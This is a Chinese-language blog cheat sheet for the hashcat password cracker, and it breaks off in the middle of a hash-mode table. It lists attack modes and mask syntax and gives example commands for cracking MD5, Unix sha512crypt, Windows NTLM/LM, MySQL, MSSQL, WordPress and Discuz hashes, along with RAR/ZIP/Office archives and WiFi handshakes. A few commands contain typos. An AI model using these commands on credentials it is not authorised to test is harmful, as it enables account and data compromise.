    <content type="html"><![CDATA[<h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><ul><li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hash]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result     [字典]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 --force [hashfile]  &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -o .&#x2F;result [批量hash]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 0 --force f2aec315704b5f007915bdbbae5a9f5c te?d?d?dst [掩码爆破]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">hashcat -a 6 -m 0 --force 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l [字典掩码]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">hashcat [hash] --show</span></pre></td></tr></table></figure></li><li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Hashcat是自称世界上最快的密码恢复工具。它在2015年之前拥有专有代码库，但现在作为免费软件发布。适用于Linux，OS X和Windows的版本可以使用基于CPU或基于GPU的变体。支持hashcat的散列算法有Microsoft LM哈希，MD4，MD5，SHA系列，Unix加密格式，MySQL和Cisco PIX等。 </p></li><li><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">--increment-max  密码最大长度,同上</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">--remove     删除已被破解成功的hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-r       使用自定义破解规则</span></pre></td></tr></table></figure><ul><li><h4 id="a参数破解模式"><a href="#a参数破解模式" class="headerlink" title="a参数破解模式"></a><strong>a</strong>参数破解模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"> # | Mode</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> 0 | Straight（字段破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> 1 | Combination（多字典组合破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> 3 | Brute-force（掩码暴力破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</span></pre></td></tr></table></figure></li><li><h4 id="m参数hash类型（详见文末）"><a href="#m参数hash类型（详见文末）" class="headerlink" title="m参数hash类型（详见文末）"></a><strong>m</strong>参数hash类型（详见文末）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">- [ Hash modes ] -</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">      # | Name                                             | Category</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">   5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">   1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">   1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">   1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">     10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">     20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr></table></figure></li><li><h3 id="掩码设置"><a href="#掩码设置" class="headerlink" title="掩码设置"></a>掩码设置</h3><ul><li>常见字符集</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz          纯小写字母(lower)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母(upper)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">d | 0123456789                      纯数字(decimal)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">h | 0123456789abcdef                常见小写子目录和数字(hex)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">H | 0123456789ABCDEF               常见大写字母和数字(HEX)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符(special)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">a | ?l?u?d?s                    键盘上所有可见的字符(all_printable)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">b | 0x00 - 0xff                 可能是用来匹配像空格这种密码的(bin)</span></pre></td></tr></table></figure><ul><li><strong>eg：</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">八位数字密码：?d?d?d?d?d?d?d?d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">八位未知密码：?a?a?a?a?a?a?a?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span></pre></td></tr></table></figure></li></ul></li></ul><ul><li><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><pre><code>- #### 7位数字破解</code></pre></li></ul><pre><code> `    hashcat -a 3 -m 0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d`- #### 7位小写字母破解  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 ?l?l?l?l?l?l?l`- #### 1-8位小写字母+数字破解  `hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --incement --increment-min 1 --inrement-max 8 h?h?h?h?h??h?h?h`- #### 1-8位为特定字符集：123456abcdf!@+-  `hashcat -a 3 -m 0 --force -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1?1?1`- ####  1-8位数字+大小写字母+可见特殊符号  `hashcat -a 3 -m 0 --force -1 ?d?l?u?s d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1`  or   `hashcat -a 3 -m 0 --force  d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a`- #### 字典破解  `hashcat -a 0 -m 0 --force [hash] password.txt -o ./result`  #### 批量爆破  `hashcat -a 0 -m 0 --force [hashfile] password.txt -o ./result`- #### 字典组合破解  `hashcat -a 1 -m 0 --force [hash] pwd1.txt pwd2.txt`- #### 字典加掩码破解  `hashcat -a 6 9dc9d5ed5031367d42543763423c24ee pwd.txt ?l?l?l?l?l`</code></pre><ul><li><h3 id="密码类型实例"><a href="#密码类型实例" class="headerlink" title="密码类型实例"></a>密码类型实例</h3><ul><li><h4 id="mysql4-1-5-passwod"><a href="#mysql4-1-5-passwod" class="headerlink" title="mysql4.1/5 passwod"></a>mysql4.1/5 passwod</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="sha512crypt-6-SHA512-Unix-破解"><a href="#sha512crypt-6-SHA512-Unix-破解" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)破解"></a>sha512crypt $6$, SHA512 (Unix)破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcate -a 3 -m 1800 --force $6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X. ?l?l?l?l</span></pre></td></tr></table></figure><p>不用整理用户名，使用–username</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 --force qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</span></pre></td></tr></table></figure></li><li><h4 id="Windows-NT-hash，LM-hash破解"><a href="#Windows-NT-hash，LM-hash破解" class="headerlink" title="Windows NT-hash，LM-hash破解"></a>Windows NT-hash，LM-hash破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">NT-hash:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">LM-hash:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</span></pre></td></tr></table></figure></li><li><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="wordpress密码hash破解"><a href="#wordpress密码hash破解" class="headerlink" title="wordpress密码hash破解"></a>wordpress密码hash破解</h4><p> 具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F; ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="discuz用户密码hash破解"><a href="#discuz用户密码hash破解" class="headerlink" title="discuz用户密码hash破解"></a>discuz用户密码hash破解</h4><p> 其密码加密方式md5(md5($pass).$salt) </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解RAR压缩密码"><a href="#破解RAR压缩密码" class="headerlink" title="破解RAR压缩密码"></a>破解RAR压缩密码</h4><p> 首先rar2john获取rar文件hash值 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">rar2john.exe 1.rar</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcate -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</span></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-m参数    类型      示例 hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12500    RAR3-hp    $RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">13000    RAR5       $rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</span></pre></td></tr></table></figure></li><li><h4 id="zip密码破解"><a href="#zip密码破解" class="headerlink" title="zip密码破解"></a>zip密码破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zip2john.exe 1.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">结果：1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$:::::1.zip-1.txt</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$&#x2F;zip2$ --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解office密码"><a href="#破解office密码" class="headerlink" title="破解office密码"></a>破解office密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">获取office的hash值：python office2john.py 11.docx</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</span></pre></td></tr></table></figure></li><li><h4 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h4><p>首先先把我们的握手包转化为hccapx格式，现在最新版的hashcat只支持hccapx格式了，以前的hccap格式已经不支持了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">官方在线转化https:&#x2F;&#x2F;hashcat.net&#x2F;cap2hccapx&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</span></pre></td></tr></table></figure></li></ul></li></ul><ul><li><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p>对于破解过的hash值，用<code>hashcat64.exe hash --show</code>查看结果</p></li><li><p>所有的hash破解结果都在hashcat.potfile文件中</p></li><li><p>如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</p></li><li><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p></li><li><p>在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1.首先走一遍常用的弱口令字典</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失</span></pre></td></tr></table></figure><p>6.HashCat参数优化<br> 考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置</p><ol><li>Workload tuning 负载调优。<br> 该参数支持的值有1,8,40,80,160  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--gpu-accel 160 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li><li>Gpu loops 负载微调  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--gpu-loops 1024 可以让GPU发挥最大性能。</span></pre></td></tr></table></figure></li><li>Segment size 字典缓存大小 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">--segment-size 512 可以提高大字典破解的速度。</span></pre></td></tr></table></figure></li></ol></li></ol></li><li><h3 id="m-参数加密类型"><a href="#m-参数加密类型" class="headerlink" title="m 参数加密类型"></a>m 参数加密类型</h3>  <figure class="highlight plain"><figcaption><span>[ Hash modes ] -</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    # | Name                                             | Category</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  900 | MD4                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    0 | MD5                                              | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> 5100 | Half MD5                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  100 | SHA1                                             | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> 1300 | SHA2-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"> 1400 | SHA2-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">10800 | SHA2-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"> 1700 | SHA2-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">17300 | SHA3-224                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">17400 | SHA3-256                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">17500 | SHA3-384                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">17600 | SHA3-512                                         | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">17700 | Keccak-224                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">17800 | Keccak-256                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">17900 | Keccak-384                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">18000 | Keccak-512                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  600 | BLAKE2b-512                                      | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">10100 | SipHash                                          | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"> 6000 | RIPEMD-160                                       | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"> 6100 | Whirlpool                                        | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"> 6900 | GOST R 34.11-94                                  | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">   10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">   20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">   30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">   40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"> 3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"> 3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"> 4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"> 4110 | 